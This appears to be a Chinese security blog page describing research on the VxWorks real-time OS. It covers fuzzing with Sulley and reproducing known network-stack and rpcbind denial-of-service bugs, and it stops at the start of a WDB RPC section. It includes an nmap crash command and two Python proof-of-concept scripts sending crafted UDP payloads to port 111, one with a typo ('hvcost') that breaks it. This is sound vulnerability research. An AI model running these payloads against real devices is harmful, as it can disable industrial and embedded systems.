<!DOCTYPE html>
<html lang="en-US">
<head>
	<title>  VxWorks工控实时操作系统漏洞挖掘调试与利用揭秘 - 安全牛</title>
		<meta name="description" content="作为使用VxWorks系统的硬件设备的系统开发人员不可或缺的工具，WDB RPC服务暴露于互联网中的危险性是极大的安全牛" />
	<meta name="keywords" content="" />
	<meta charset="utf-8">
	<link rel="icon" href="http://www.aqniu.com/wp-content/themes/anquanniu/images/favicon.ico" type="image/x-icon" />
	<!-- Custom Fonts -->
	<link href="https://fonts.googleapis.com/css?family=Roboto:100,300,300i,400,400i,500,700,700i,900" rel="stylesheet">
	<!-- HTML5 Shim and Respond.js IE8 support of HTML5 elements and media queries -->
	<!-- WARNING: Respond.js doesn't work if you view the page via file:// -->
	<!--[if lt IE 9]>
			<script src="https://oss.maxcdn.com/libs/html5shiv/3.7.0/html5shiv.js"></script>
			<script src="https://oss.maxcdn.com/libs/respond.js/1.4.2/respond.min.js"></script>
	<![endif]-->
	<meta content="yes" name="apple-mobile-web-app-capable">
	<meta content="yes" name="apple-touch-fullscreen">

	<link rel="stylesheet" href="http://www.aqniu.com/wp-content/themes/anquanniu/style.css" type="text/css" media="screen" />
	<script src="http://www.aqniu.com/wp-content/themes/anquanniu/js/jquery.min.js"></script>
	<script src="http://www.aqniu.com/wp-content/themes/anquanniu/js/jquery-ias.min.js" type="text/javascript"></script>

	<script type="text/javascript">
	   var ias = $.ias({
	     container: "#content",
	     item: ".post",
	     pagination: ".navigation",
	     next: ".nav-previous a",
	   });

	   ias.extension(new IASTriggerExtension({offset: 2}));
	   ias.extension(new IASSpinnerExtension());
	   ias.extension(new IASNoneLeftExtension());
	 </script>
</head>
<link rel='dns-prefetch' href='//s.w.org' />
<link rel="alternate" type="application/rss+xml" title="安全牛 &raquo; VxWorks工控实时操作系统漏洞挖掘调试与利用揭秘评论Feed" href="http://www.aqniu.com/hack-geek/13128.html/feed" />
		<script type="text/javascript">
			window._wpemojiSettings = {"baseUrl":"https:\/\/s.w.org\/images\/core\/emoji\/2.3\/72x72\/","ext":".png","svgUrl":"https:\/\/s.w.org\/images\/core\/emoji\/2.3\/svg\/","svgExt":".svg","source":{"concatemoji":"http:\/\/www.aqniu.com\/wp-includes\/js\/wp-emoji-release.min.js?ver=4.8.1"}};
			!function(a,b,c){function d(a){var b,c,d,e,f=String.fromCharCode;if(!k||!k.fillText)return!1;switch(k.clearRect(0,0,j.width,j.height),k.textBaseline="top",k.font="600 32px Arial",a){case"flag":return k.fillText(f(55356,56826,55356,56819),0,0),b=j.toDataURL(),k.clearRect(0,0,j.width,j.height),k.fillText(f(55356,56826,8203,55356,56819),0,0),c=j.toDataURL(),b===c&&(k.clearRect(0,0,j.width,j.height),k.fillText(f(55356,57332,56128,56423,56128,56418,56128,56421,56128,56430,56128,56423,56128,56447),0,0),b=j.toDataURL(),k.clearRect(0,0,j.width,j.height),k.fillText(f(55356,57332,8203,56128,56423,8203,56128,56418,8203,56128,56421,8203,56128,56430,8203,56128,56423,8203,56128,56447),0,0),c=j.toDataURL(),b!==c);case"emoji4":return k.fillText(f(55358,56794,8205,9794,65039),0,0),d=j.toDataURL(),k.clearRect(0,0,j.width,j.height),k.fillText(f(55358,56794,8203,9794,65039),0,0),e=j.toDataURL(),d!==e}return!1}function e(a){var c=b.createElement("script");c.src=a,c.defer=c.type="text/javascript",b.getElementsByTagName("head")[0].appendChild(c)}var f,g,h,i,j=b.createElement("canvas"),k=j.getContext&&j.getContext("2d");for(i=Array("flag","emoji4"),c.supports={everything:!0,everythingExceptFlag:!0},h=0;h<i.length;h++)c.supports[i[h]]=d(i[h]),c.supports.everything=c.supports.everything&&c.supports[i[h]],"flag"!==i[h]&&(c.supports.everythingExceptFlag=c.supports.everythingExceptFlag&&c.supports[i[h]]);c.supports.everythingExceptFlag=c.supports.everythingExceptFlag&&!c.supports.flag,c.DOMReady=!1,c.readyCallback=function(){c.DOMReady=!0},c.supports.everything||(g=function(){c.readyCallback()},b.addEventListener?(b.addEventListener("DOMContentLoaded",g,!1),a.addEventListener("load",g,!1)):(a.attachEvent("onload",g),b.attachEvent("onreadystatechange",function(){"complete"===b.readyState&&c.readyCallback()})),f=c.source||{},f.concatemoji?e(f.concatemoji):f.wpemoji&&f.twemoji&&(e(f.twemoji),e(f.wpemoji)))}(window,document,window._wpemojiSettings);
		</script>
		<style type="text/css">
img.wp-smiley,
img.emoji {
	display: inline !important;
	border: none !important;
	box-shadow: none !important;
	height: 1em !important;
	width: 1em !important;
	margin: 0 .07em !important;
	vertical-align: -0.1em !important;
	background: none !important;
	padding: 0 !important;
}
</style>
<link rel='stylesheet' id='bp-legacy-css-css'  href='http://www.aqniu.com/wp-content/plugins/buddypress/bp-templates/bp-legacy/css/buddypress.min.css?ver=2.8.2' type='text/css' media='screen' />
<link rel='stylesheet' id='font-awesome-css'  href='http://www.aqniu.com/wp-content/plugins/download-manager/assets/font-awesome/css/font-awesome.min.css?ver=4.8.1' type='text/css' media='all' />
<link rel='stylesheet' id='wpdm-bootstrap-css'  href='http://www.aqniu.com/wp-content/plugins/download-manager/assets/bootstrap/css/bootstrap.css?ver=4.8.1' type='text/css' media='all' />
<link rel='stylesheet' id='wpdm-front-css'  href='http://www.aqniu.com/wp-content/plugins/download-manager/assets/css/front.css?ver=4.8.1' type='text/css' media='all' />
<link rel='stylesheet' id='ajax-comment-css'  href='http://www.aqniu.com/wp-content/themes/anquanniu/ajax-comment/app.css?ver=1.0.0' type='text/css' media='all' />
<link rel='stylesheet' id='mc4wp-form-themes-css'  href='http://www.aqniu.com/wp-content/plugins/mailchimp-for-wp/assets/css/form-themes.min.css?ver=4.1.3' type='text/css' media='all' />
<link rel='stylesheet' id='forget-about-shortcode-buttons-css'  href='http://www.aqniu.com/wp-content/plugins/forget-about-shortcode-buttons/public/css/button-styles.css?ver=2.1.0' type='text/css' media='all' />
<script type='text/javascript' src='http://www.aqniu.com/wp-includes/js/jquery/jquery.js?ver=1.12.4'></script>
<script type='text/javascript' src='http://www.aqniu.com/wp-includes/js/jquery/jquery-migrate.min.js?ver=1.4.1'></script>
<script type='text/javascript'>
/* <![CDATA[ */
var BP_Confirm = {"are_you_sure":"\u786e\u5b9a\uff1f"};
/* ]]> */
</script>
<script type='text/javascript' src='http://www.aqniu.com/wp-content/plugins/buddypress/bp-core/js/confirm.min.js?ver=2.8.2'></script>
<script type='text/javascript' src='http://www.aqniu.com/wp-content/plugins/buddypress/bp-core/js/widget-members.min.js?ver=2.8.2'></script>
<script type='text/javascript' src='http://www.aqniu.com/wp-content/plugins/buddypress/bp-core/js/jquery-query.min.js?ver=2.8.2'></script>
<script type='text/javascript' src='http://www.aqniu.com/wp-content/plugins/buddypress/bp-core/js/vendor/jquery-cookie.min.js?ver=2.8.2'></script>
<script type='text/javascript' src='http://www.aqniu.com/wp-content/plugins/buddypress/bp-core/js/vendor/jquery-scroll-to.min.js?ver=2.8.2'></script>
<script type='text/javascript'>
/* <![CDATA[ */
var BP_DTheme = {"accepted":"\u5df2\u63a5\u53d7","close":"\u5173\u95ed","comments":"\u8bc4\u8bba","leave_group_confirm":"\u60a8\u786e\u5b9a\u8981\u9000\u51fa\u8be5\u7fa4\u5417\uff1f","mark_as_fav":"\u6536\u85cf","my_favs":"\u6211\u7684\u6536\u85cf","rejected":"\u5df2\u62d2\u7edd","remove_fav":"\u79fb\u9664\u6536\u85cf","show_all":"\u663e\u793a\u5168\u90e8","show_all_comments":"\u663e\u793a\u8be5\u8bdd\u9898\u6240\u6709\u8bc4\u8bba","show_x_comments":"Show all comments (%d)","unsaved_changes":"\u60a8\u7684\u4e2a\u4eba\u8d44\u6599\u66f4\u6539\u5c1a\u672a\u4fdd\u5b58\u3002\u5982\u679c\u79bb\u5f00\u6b64\u9875\u9762\uff0c\u60a8\u7684\u66f4\u6539\u5c06\u4f1a\u4e22\u5931\u3002","view":"View"};
/* ]]> */
</script>
<script type='text/javascript' src='http://www.aqniu.com/wp-content/plugins/buddypress/bp-templates/bp-legacy/js/buddypress.min.js?ver=2.8.2'></script>
<script type='text/javascript' src='http://www.aqniu.com/wp-content/plugins/download-manager/assets/bootstrap/js/bootstrap.min.js?ver=4.8.1'></script>
<script type='text/javascript' src='http://www.aqniu.com/wp-content/plugins/download-manager/assets/js/front.js?ver=4.8.1'></script>
<script type='text/javascript' src='http://www.aqniu.com/wp-content/plugins/download-manager/assets/js/chosen.jquery.min.js?ver=4.8.1'></script>
<script type='text/javascript'>
/* <![CDATA[ */
var IwNRCargs = {"rightclick":"Y","draganddrop":"N"};
/* ]]> */
</script>
<script type='text/javascript' src='http://www.aqniu.com/wp-content/plugins/image-watermark/js/no-right-click.js?ver=1.6.1'></script>
<meta name="generator" content="WordPress Download Manager 2.9.52" />
<link rel='https://api.w.org/' href='http://www.aqniu.com/wp-json/' />
<link rel="EditURI" type="application/rsd+xml" title="RSD" href="http://www.aqniu.com/xmlrpc.php?rsd" />
<link rel="wlwmanifest" type="application/wlwmanifest+xml" href="http://www.aqniu.com/wp-includes/wlwmanifest.xml" /> 
<link rel='prev' title='施耐德电气重要信息安全通知——M340以太网模块Web服务漏洞' href='http://www.aqniu.com/threat-alert/13124.html' />
<link rel='next' title='美国国家情报总监手机和个人电邮被黑' href='http://www.aqniu.com/threat-alert/13155.html' />
<link rel="canonical" href="http://www.aqniu.com/hack-geek/13128.html" />
<link rel='shortlink' href='http://www.aqniu.com/?p=13128' />
<link rel="alternate" type="application/json+oembed" href="http://www.aqniu.com/wp-json/oembed/1.0/embed?url=http%3A%2F%2Fwww.aqniu.com%2Fhack-geek%2F13128.html" />
<link rel="alternate" type="text/xml+oembed" href="http://www.aqniu.com/wp-json/oembed/1.0/embed?url=http%3A%2F%2Fwww.aqniu.com%2Fhack-geek%2F13128.html&#038;format=xml" />

	<script type="text/javascript">var ajaxurl = 'http://www.aqniu.com/wp-admin/admin-ajax.php';</script>


        <script>
            var wpdm_site_url = 'http://www.aqniu.com/';
            var wpdm_home_url = 'http://www.aqniu.com/';
            var ajax_url = 'http://www.aqniu.com/wp-admin/admin-ajax.php';
        </script>


        <style type="text/css">/* MailChimp for WP - Checkbox Styles */
.mc4wp-checkbox-wp-registration-form {
  clear: both;
  display: block;
  position: static;
  width: auto; }
  .mc4wp-checkbox-wp-registration-form input {
    float: none;
    width: auto;
    position: static;
    margin: 0 6px 0 0;
    padding: 0;
    vertical-align: middle;
    display: inline-block !important;
    max-width: 21px;
    -webkit-appearance: checkbox; }
  .mc4wp-checkbox-wp-registration-form label {
    float: none;
    display: block;
    cursor: pointer;
    width: auto;
    position: static;
    margin: 0 0 16px 0; }
</style><body>
	<div class="wrapper">
		<!-- SIDE MENU -->
		<div id="sidebar-wrapper" class="hidden-xs">
			<ul class="nav navbar-nav">
				<li><a href="http://www.aqniu.com">首页</a></li>
				<li><a href="http://www.aqniu.com/?cat=132">牛闻牛评</a></li>
				<li><a href="http://www.aqniu.com/?cat=4">行业动态</a></li>
				<li><a href="http://www.aqniu.com/?cat=126">威胁情报</a></li>
	      <li><a href="http://www.aqniu.com/?cat=78">术有专攻</a></li>
	      <li><a href="http://www.aqniu.com/?cat=77">黑极空间</a></li>
	      <li><a href="http://www.aqniu.com/?cat=81">技术产品</a></li>

	      <li><a href="http://job.aqniu.com" target="_blank">牛聘</a></li>
	      <li><a href="http://edu.aqniu.com" target="_blank">安全课堂</a></li>
	      <li><a href="http://all.aqniu.com" target="_blank">全景图</a></li>
			</ul>
		</div>
		<!-- // SIDE MENU -->

		<!-- HEADER / MENU -->
		<header class="header1 header-megamenu">
			<div class="topbar">
				<div class="container">
					<div class="row">
						<div class="col-md-8 col-sm-8 hidden-xs">
							<div class="newsfeed">
								<span>安全牛，才是真牛！</span>

							</div>
						</div>
						<div class="col-md-4 col-sm-4 col-xs-12">
							<div class="pull-right account-options">
																<a href="#"  id="user-login" class="login user-login">登录/注册</a>
								
							</div>
						</div>
					</div>
				</div>
			</div>
			<div class="clearfix"></div>
			<div class="navbar-header padding-vertical-10">
				<div class="container">

					<a href="http://www.aqniu.com" class="navbar-brand"><img src="http://www.aqniu.com/wp-content/themes/anquanniu/images/aqniu-logo.svg" class="img-responsive" alt=""/></a>
					<div class="ad-banner pull-right hidden-xs">
						<!-- 广告位：top-banner -->
<script>
(function() {
    var s = "_" + Math.random().toString(36).slice(2);
    document.write('<div id="' + s + '"></div>');
    (window.slotbydup=window.slotbydup || []).push({
        id: '4098195',
        container: s,
        size: '728,90',
        display: 'inlay-fix'
    });
})();
</script>
<script src="http://dup.baidustatic.com/js/os.js"></script>
					</div>
				</div>
			</div>
			<div class="clearfix"></div>
			<div class="container">
				<button type="button" class="navbar-toggle collapsed" data-toggle="collapse" data-target="#navbar" aria-expanded="false" aria-controls="navbar">
				<span>菜单</span>
				<span class="fa fa-navicon"></span>
				</button>

				<div class="search-wrap2">
					<form method="get" action="http://www.aqniu.com/">
						<input type="text" placeholder="请输入关键词，按回车检索"  name="s">
						<div class="sw2-close"><span class="fa fa-close"></span></div>
					</form>
				</div>






				<div id="navbar" class="navbar-collapse collapse">
					<ul class="nav navbar-nav">
						<li><a href="http://www.aqniu.com">首页</a></li>
						<li><a href="http://www.aqniu.com/?cat=132">牛闻牛评</a></li>
						<li><a href="http://www.aqniu.com/?cat=4">行业动态</a></li>
						<li><a href="http://www.aqniu.com/?cat=126">威胁情报</a></li>
			      <li><a href="http://www.aqniu.com/?cat=78">术有专攻</a></li>
			      <li><a href="http://www.aqniu.com/?cat=77">黑极空间</a></li>
			      <li><a href="http://www.aqniu.com/?cat=81">技术产品</a></li>

			      <li><a href="http://job.aqniu.com" target="_blank">牛聘</a></li>
			      <li><a href="http://edu.aqniu.com" target="_blank">安全课堂</a></li>
			      <li><a href="http://all.aqniu.com" target="_blank">全景图</a></li>

						<li class="pull-right hidden-xs">
							<div class="search-trigger search-trigger2"><i class="fa fa-search"></i></div>
						</li>
					</ul>

				</div>
			</div>
		</header>
		<!-- // HEADER / MENU -->
	<div class="container single-post padding-bottom-30">
		<div class="row">
            			<div class="col-md-12 margin-bottom-30">
				<p>&nbsp;</p>
				<img src="http://www.aqniu.com/wp-content/themes/anquanniu/timthumb.php?src=http://www.aqniu.com/wp-content/uploads/2016/01/fuzzinf-Sulley_副本.jpg&h=440&w=1080&zc=1" class="img-responsive" alt=""/>
			</div>
			<div class="clearfix"></div>
			<div class="col-md-8 col-sm-7 padding-bottom-30">
				<div class="blog-excerpt">
					<div class="blog-single-head">
						<h2>VxWorks工控实时操作系统漏洞挖掘调试与利用揭秘</h2>
						<div class="meta"><span class="author">作者：<a href="http://www.aqniu.com/author/admin" title="由aqniu发布" rel="author">aqniu</a></span><span class="date">星期五, 一月 15, 2016</span><span class="comments">0</span></div>
					</div>
					<div class="single-share">
						<span>分享:</span>
						<div class="bdsharebuttonbox">
							<a href="#" class="bds_tsina" data-cmd="tsina" title="分享到新浪微博"></a>
							<a href="#" class="bds_weixin" data-cmd="weixin" title="分享到微信"></a>
							<a href="#" class="bds_linkedin" data-cmd="linkedin" title="分享到linkedin"></a>
							<a href="#" class="bds_mail" data-cmd="mail" title="分享到邮件分享"></a>
							<a href="#" class="bds_print" data-cmd="print" title="分享到打印"></a>
						</div>
						<script type="text/javascript">
							window._bd_share_config={"common":{"bdSnsKey":{},"bdText":"","bdMini":"1","bdMiniList":false,"bdPic":"","bdStyle":"0","bdSize":"32"},"share":{}};with(document)0[(getElementsByTagName('head')[0]||body).appendChild(createElement('script')).src='http://bdimg.share.baidu.com/static/api/js/share.js?v=89860593.js?cdnversion='+~(-new Date()/36e5)];
						</script>
					</div>
					<p><p><strong>一、前言</strong></p>
<p>关于VxWorks，这里引用44CON议题<a href="http://www.freebuf.com/vuls/78277.html">《攻击 VxWorks：从石器时代到星际》探究</a> 一文章中的介绍：</p>
<p>VxWorks 是世界上使用最广泛的一种在嵌入式系统中部署的实时操作系统，是由美国WindRiver公司（简称风河公司，即WRS 公司）于1983年设计开发的。其市场范围跨越所有的安全关键领域，仅举几例，包括火星好奇心流浪者、波音787梦幻客机、网络路由器。这些应用程序的安全高危性质使得VxWorks的安全被高度关注。</p>
<p>VxWorks操作系统是由美国Wind River(风河公司)开发的一种嵌入式实时操作系统（RTOS），已宣称拥有至少15亿台设备，VxWorks支持几乎所有现代市场上的嵌入式CPU架构，包括x86系列、MIPS、 PowerPC、Freescale ColdFire、Intel i960、SPARC、SH-4、ARM, StrongARM以及xScale CPU。</p>
<p>在2015年9月9日-11日举办的44CON伦敦峰会中，Yannick Formaggio介绍了他对VxWorks进行深入安全研究的方法，他采用了Fuzzing框架Sulley对VxWorks系统的多个协议进行了Fuzzing，挖掘到一些漏洞，并结合VxWorks的WDB RPC实现了一个远程调试器，进行了相关调试分析。</p>
<p>其中很多实现及漏洞细节没有公开，我们搭建了VxWorks 5.5及VxWorks 6.6的x86虚拟环境，参照Formaggio的方法，对VxWorks进行了初步的安全研究，本文将对相关研究细节及结果进行介绍。</p>
<p>本文内容包括：</p>
<ul>
<li>漏洞概览</li>
<li>安装Fuzzing框架Sulley &amp; 相关协议Fuzzing</li>
<li>VxWorks WDB RPC V2分析</li>
<li>暴露在互联网中的VxWorks WDB RPC V2服务!!!</li>
</ul>
<p>本文无法涉及所有研究细节及方法，因此提供如下相关资料以供补充参考：</p>
<ul>
<li><a href="https://github.com/knownsec/VxPwn/tree/master/doc">VxWorks 5.5 &amp; 6.6模拟环境搭建</a></li>
<li><a href="http://www.vxdev.com/html/44/624.htm">vmWare上运行VxWorks(5.5)</a></li>
<li><a href="http://blog.chinaunix.net/uid-25979788-id-1747694.html">Python灰帽子 第9章 Sulley</a></li>
<li>Sulley官方文档：<a href="https://github.com/OpenRCE/sulley">git项目</a>目录文件sulley/docs/index.html</li>
</ul>
<p><strong>二、漏洞概览</strong></p>
<p>我们复现了Formaggio指出的安全问题，没有发现新的问题，这些漏洞详情如下：</p>
<ol>
<li><strong>网络栈问题</strong></li>
</ol>
<p>（1）漏洞描述：某些x版本的VxWorks系统在短时间内接受到大量的网络数据包，会造成网络栈崩溃，导致VxWorks无法再与外界主机通信。在部分情况下，终端会给出错误信息，报错信息如下图：</p>
<p><a href="http://www.aqniu.com/wp-content/uploads/2016/01/11.jpg"><img class="aligncenter size-full wp-image-13129" src="http://www.aqniu.com/wp-content/uploads/2016/01/11.jpg" alt="1" width="1428" height="896" srcset="http://www.aqniu.com/wp-content/uploads/2016/01/11.jpg 1428w, http://www.aqniu.com/wp-content/uploads/2016/01/11-300x188.jpg 300w, http://www.aqniu.com/wp-content/uploads/2016/01/11-1024x643.jpg 1024w" sizes="(max-width: 1428px) 100vw, 1428px" /></a></p>
<p>这里需要指出的是，有的情况下漏洞触发成功而造成DoS后，VxWorks终端并<strong>不会</strong>输出：</p>
<blockquote><p>interrupt: panic: netJobAdd: ring buffer overflow!</p></blockquote>
<p>的提示，但此时VxWorks的网络栈已经崩溃，已无法再与外界通信，这一点可以通过持续ping来进行验证。</p>
<p>如上错误提示一般会在收到的数据包量非常大的情况下才会出现。</p>
<p>（2）影响版本：部分x版本</p>
<p>（3）验证方式：</p>
<ul>
<li>执行nmap命令（可能需要执行多次） <strong>sudo nmap -sU -p110-166 -r -T5 -n 192.168.1.111</strong>，其中168.1.111为运行VxWorks 5.5版本的主机IP，在收到上述扫描数据包后，VxWorks主机并没有错误提示，但是网络栈已经崩溃，无法再与外界进行通信。</li>
<li>对tcp/21运行的FTP服务连续发送体积极大的FTP请求数据包。</li>
<li>也可用如下Python代码验证该问题：</li>
</ul>
<p>import socket</p>
<p>UDP_PAYLOAD = &#8216;\x72\xfe\x1d\x13\x00\x00\x00\x00\x00\x00\x00\x02\x00\x01\x86\xa0\x00\x01\x97\x7c\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00&#8217;</p>
<p>def poc1(host, rpcPort=111, pktNum=6859):</p>
<p>sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)</p>
<p>for i in xrange(pktNum):</p>
<p>sock.sendto(UDP_PAYLOAD, (hvcost, 111))</p>
<p>def poc2(host, rpcPort=111, portNum=26):</p>
<p>sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)</p>
<p>for port in xrange(rpcPort, rpcPort+portNum+1):</p>
<p>sock.sendto(UDP_PAYLOAD, (host, port))</p>
<p>if __name__ == &#8216;__main__&#8217;:</p>
<p>import sys</p>
<p>poc1(host=sys.argv[1], rpcPort=111, pktNum=100000000)</p>
<p>#poc2(host=sys.argv[1], rpcPort=111, portNum=27)</p>
<ol start="2">
<li><strong>rpcbind</strong><strong>服务问题</strong></li>
</ol>
<p>（1）漏洞描述：rpcbind服务是SUN-RPC的一部分，在VxWorks系统中该服务监听在tcp/111及udp/111端口，攻击者向该端口发送经过特殊构造的数据包，可使rpcbind服务崩溃，精心构造的请求可能可以造成任意代码执行。终端会给出错误信息，报错信息如下图：</p>
<p><a href="http://www.aqniu.com/wp-content/uploads/2016/01/22.jpg"><img class="aligncenter size-full wp-image-13130" src="http://www.aqniu.com/wp-content/uploads/2016/01/22.jpg" alt="2" width="1424" height="905" srcset="http://www.aqniu.com/wp-content/uploads/2016/01/22.jpg 1424w, http://www.aqniu.com/wp-content/uploads/2016/01/22-300x191.jpg 300w, http://www.aqniu.com/wp-content/uploads/2016/01/22-1024x651.jpg 1024w" sizes="(max-width: 1424px) 100vw, 1424px" /></a></p>
<p>（2）影响版本：x &amp; 6.x</p>
<p>（3）验证方式：可用如下Python代码验证该漏洞：</p>
<p>import socket</p>
<p>PAYLOAD_HEX = &#8216;cc6ff7e200000000000000020001a086000000040000000488888888000000110000001100001111111111111111111111111111&#8217;</p>
<p>def poc(host, rpcPort=111):</p>
<p>sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)</p>
<p>sock.sendto(PAYLOAD_HEX.decode(&#8216;hex&#8217;), (host, rpcPort))</p>
<p>if __name__ == &#8216;__main__&#8217;:</p>
<p>import sys</p>
<p>poc(sys.argv[1])</p>
<p><strong>三、Sulley </strong><strong>安装 &amp; 协议Fuzzing</strong></p>
<p>Formaggio使用Sulley对VxWorks进行Fuzzing，我们学习他的方式，尝试实现基于Sulley的Fuzzing。</p>
<ol>
<li><strong>安装Sulley</strong></li>
</ol>
<p>关于Sulley的安装，官方有给出较为详细的文档：<a href="https://github.com/OpenRCE/sulley/wiki/Windows-Installation">Sulley &#8211; Windows Installation</a></p>
<p>FreeBuf也有文章对上述文档进行了翻译：<a href="http://www.freebuf.com/articles/network/34136.html">在渗透测试中使用fuzz技术(附windows安装指南)</a></p>
<p>这里简单给出我们的安装过程，环境Win7 x86：</p>
<p>（1）MinGW</p>
<ul>
<li><a href="https://github.com/develersrl/gccwinbinaries/releases/download/v1.1/gcc-mingw-4.3.3-setup.exe">下载</a></li>
<li>安装时，在&#8221;Select Components&#8221;对话框中，除了默认选项，还需勾选&#8221;C++ Compiler&#8221;和&#8221;ObjC Compiler&#8221;</li>
</ul>
<p>（2）下载并安装Python 2.7 x86版本（<strong>请安装7.2版本，高版本如2.7.11在后续编译libdasm步骤中可能出错</strong>）</p>
<p>（3）下载并安装<a href="http://git-scm.com/download/win">Git for Windows</a></p>
<p>（4）将C:\Python27和C:\MinGW\bin加入到系统环境变量$PATH中</p>
<p>（5）pydbg</p>
<ul>
<li>下载: C:\sulley\build&gt;<strong>git clone https://Fitblip@github.com/Fitblip/pydbg.git</strong></li>
<li>编译安装：C:\sulley\build\pydbg&gt; <strong>python setup.py install</strong></li>
</ul>
<p>（6）libdasm</p>
<ul>
<li><a href="http://libdasm.googlecode.com/files/libdasm-beta.zip">下载(墙)</a> 并解压</li>
<li>编译: C:\sulley\build\libdisasm\pydasm&gt;<strong>python setup.py build_ext -c min2</strong></li>
<li>安装: C:\sulley\build\libdisasm\pydasm&gt;<strong>python setup.py install</strong></li>
</ul>
<p>（7）下载并安装<a href="https://www.winpcap.org/install/bin/WinPcap_4_1_3.exe">WinPcap</a></p>
<p>（8）下载<a href="https://www.winpcap.org/install/bin/WpdPack_4_1_2.zip">WinPcap Dev Kit(WpdPack)</a></p>
<p>（9）PCapy</p>
<ul>
<li><a href="https://github.com/CoreSecurity/pcapy">下载</a>并解压</li>
<li>编译(需指定WpdPack中的include目录及lib目录): C:\sulley_build\pcapy-0.10.5&gt;<strong>python setup.py build_ext -c mingw32 -I &#8220;C:\sulley_build\WpdPack\Include&#8221; -L &#8220;C:\sulley_build\WpdPack\Lib&#8221;</strong></li>
<li>安装: C:\sulley_build\pcapy-0.10.5&gt;<strong>python setup.py install</strong></li>
</ul>
<p>（10）下载并安装setuptools和pip</p>
<p>（11）安装impacket: <strong>pip install -U impacket</strong></p>
<p>（12）Sulley</p>
<ul>
<li>下载: C:\sulley_build&gt;<strong>git clone https://github.com/OpenRCE/sulley.git</strong></li>
<li>确认py正常工作(无import异常): C:\sulley_build\sulley&gt;<strong>python process_monitor.py</strong></li>
<li>确认py正常工作(正常会打印网卡列表): C:\sulley_build\sulley&gt;<strong>python network_monitor.py</strong></li>
</ul>
<ol start="2">
<li><strong>FTP</strong><strong>协议 (tcp/21) Fuzzing</strong></li>
</ol>
<p>FTP协议中很多命令需要在登录后才能执行，我们主要关注未登录的情况。</p>
<p>github上已有人公开了基于Sulley的<a href="https://github.com/proteansec/fuzzyftp">FTP Fuzzing程序</a>，我们直接用其进行Fuzzing，该脚本ftp.py fuzz的协议字段节点图如下：</p>
<p><a href="http://www.aqniu.com/wp-content/uploads/2016/01/32.jpg"><img class="aligncenter size-full wp-image-13131" src="http://www.aqniu.com/wp-content/uploads/2016/01/32.jpg" alt="3" width="2836" height="918" srcset="http://www.aqniu.com/wp-content/uploads/2016/01/32.jpg 2836w, http://www.aqniu.com/wp-content/uploads/2016/01/32-300x97.jpg 300w, http://www.aqniu.com/wp-content/uploads/2016/01/32-1024x331.jpg 1024w" sizes="(max-width: 2836px) 100vw, 2836px" /></a></p>
<p>Fuzzing结果：</p>
<ul>
<li>6版本无影响。</li>
<li>5连续发送极大的FTP请求包时，会造成ring buffer overflow，导致VxWorks无法进行网络通信。该问题也属于上文中已经提到的网络栈问题，不属于FTP协议问题。</li>
</ul>
<ol start="3">
<li><strong>Sun RPC</strong><strong>协议 &#8211; rpcbind服务(tcp/111 udp/111) Fuzzing</strong></li>
</ol>
<p>关于Sun RPC的细节可以参考如下文档:</p>
<ul>
<li>Unix网络编程 卷二 第二版 第16章</li>
<li><a href="http://docs.oracle.com/cd/E19683-01/816-1435/rpcproto-13077/index.html">ONC+ Developer&#8217;s Guide &#8211; Appendix B RPC Protocol and Language Specification</a></li>
</ul>
<p>根据协议我们实现了Fuzzing脚本<a href="https://github.com/knownsec/VxPwn/blob/master/sulley/rpcbind.py">rpcbind.py</a>，其中使用到了后文中将提到的<a href="https://github.com/knownsec/VxPwn/blob/master/sulley/wdbdbg.py">wdbdbg.py</a>，以记录崩溃时调试信息、实现VxWorks主机的自动重启等功能，fuzz的协议字段节点图如下：</p>
<p><a href="http://www.aqniu.com/wp-content/uploads/2016/01/42.jpg"><img class="aligncenter size-full wp-image-13132" src="http://www.aqniu.com/wp-content/uploads/2016/01/42.jpg" alt="4" width="286" height="625" srcset="http://www.aqniu.com/wp-content/uploads/2016/01/42.jpg 286w, http://www.aqniu.com/wp-content/uploads/2016/01/42-137x300.jpg 137w" sizes="(max-width: 286px) 100vw, 286px" /></a></p>
<p>其中common_fields为一些结构统一的字段共同构成的汇总request，它包含如下协议字段：</p>
<table width="555">
<tbody>
<tr>
<td width="83"><strong>字段变量</strong></td>
<td width="255"><strong>字段释义</strong></td>
<td width="88"><strong>字段长度（字节）</strong></td>
<td width="130"><strong>字段类型</strong></td>
</tr>
<tr>
<td width="83">&nbsp;</td>
<td width="255">&nbsp;</td>
<td width="88">&nbsp;</td>
<td width="130">&nbsp;</td>
</tr>
<tr>
<td width="83">xid</td>
<td width="255">transaction identifier</td>
<td width="88">4</td>
<td width="130">unsigned int</td>
</tr>
<tr>
<td width="83">mtype</td>
<td width="255">message type</td>
<td width="88">4</td>
<td width="130">enum</td>
</tr>
<tr>
<td width="83">rpcvers</td>
<td width="255">rpc version</td>
<td width="88">4</td>
<td width="130">unsigned int</td>
</tr>
<tr>
<td width="83">prog</td>
<td width="255">remote program</td>
<td width="88">4</td>
<td width="130">unsigned int</td>
</tr>
<tr>
<td width="83">vers</td>
<td width="255">remote program version</td>
<td width="88">4</td>
<td width="130">unsigned int</td>
</tr>
<tr>
<td width="83">proc</td>
<td width="255">the procedure within the remote program to be called</td>
<td width="88">4</td>
<td width="130">unsigned int</td>
</tr>
</tbody>
</table>
<p>后续为一些变长字段，请参照协议说明及<a href="https://github.com/knownsec/VxPwn/blob/master/poc/rpcbind.py">rpcbind.py</a>代码，不再赘述。</p>
<p>Fuzzing结果:</p>
<ul>
<li>5及6.6版本均测试出18处崩溃点，通过观察结果中的寄存器状态，都属于一类，该漏洞仅造成tPortmapd服务崩溃，对其他服务没有影响。该漏洞Formaggio在44 con上进行过详细分析。</li>
</ul>
<p><strong>四、WDB RPC</strong></p>
<p>要实现自动或半自动化Fuzzing通常需解决如下问题：</p>
<ul>
<li>随机或是随机的方式生成大量协议数据包：（本次由Sulley生成）</li>
<li>将生成的数据包发送给被测试组件/服务 （本次需基于Sulley实现针对特定协议的Fuzz脚本）</li>
<li>检测被测组件的状态，如是否能够响应、响应是否正确等（难点）</li>
<li>获取组件异常信息，如崩溃原因、内存内容等 （难点）</li>
<li>被测组件环境复原，如重启</li>
</ul>
